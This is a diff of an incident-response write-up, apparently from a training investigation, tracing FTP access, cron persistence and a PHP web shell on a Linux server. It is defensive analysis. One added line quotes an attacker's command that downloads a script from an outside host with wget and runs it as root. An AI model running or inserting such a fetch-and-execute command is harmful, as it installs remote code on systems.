@@ -2,10 +2,10 @@
 
 ## Scenario 
 
-A potential compromise on a Linux developer server after suspicious Slack activity and unusual network connections were reported
+A potential compromise on a Linux developer server after suspicious Slack activity and unusual network connections were reported.The objective was to investigate potential host-based indicators and confirm whether the two incidents were related.
 
 ## Summary
-The threat actor utilized FTP to gain initial access to the server
+The threat actor gained initial access to the server via FTP and established persistence using a cron job that periodically downloaded and executed a malicious shell script. Further analysis revealed the use of a PHP web shell for remote command execution.
 
 ## Commands Run
 - journalctl | grep -i "ftp" | grep -i "success"  to check for successful FTP authentications
@@ -16,14 +16,20 @@ The threat actor utilized FTP to gain initial access to the server
 ## Findings (timeline)
 
 ### Initial Access
-- Access via FTP on Sept 3rd at 05:52:31
+- Timestamp: Sept 3, 2021 – 05:52:31
+- Method: FTP login using account ftpadam
+- Source IP: 110.44.125.139
+- Evidence of successful FTP authentication confirming external access to the system.
 ![FTP](image.png)
 
 ### Persistence
-- A shell script was dropped to the tmp directory by root via wget on Sept 05 at 00:00:01 and made it executable 
-![Shell Script](image-1.png)
+- Timestamp: Sept 5, 2021 – 00:00:01
+- Mechanism: A shell script was dropped in /tmp via wget, made executable, and executed by root.
+- Command observed in logs: `wget http://crest.tt/bJx3 -O /tmp/tmp.sh && chmod +x /tmp/tmp.sh && bash /tmp/tmp.sh`
 
-- A weekly cron job that downloads a remote script to the tmp directory and attempts to execute it as root
+
+- A weekly cron job was also created to automatically download and execute the same remote script as root, ensuring continuous persistence.
+![Shell Script](image-1.png)
 ![Cron Job](image-2.png)
 
 ### Remote code execution via web shell
@@ -31,10 +37,10 @@ A PHP file was. The snippet in the screenshot below checks whether an HTTP param
 ![alt text](image-3.png)
 
 The last activity performed by the user on Sept 3rd 09:25:25
-![alt text](image-4.png)
+![Last Activity](image-4.png)
 
 
-## Mitigation
+## Mitigation Recommendations
 - Steps to remove, patch, block IPs, rotate creds
 
 ## MITRE ATT&CK Mapping
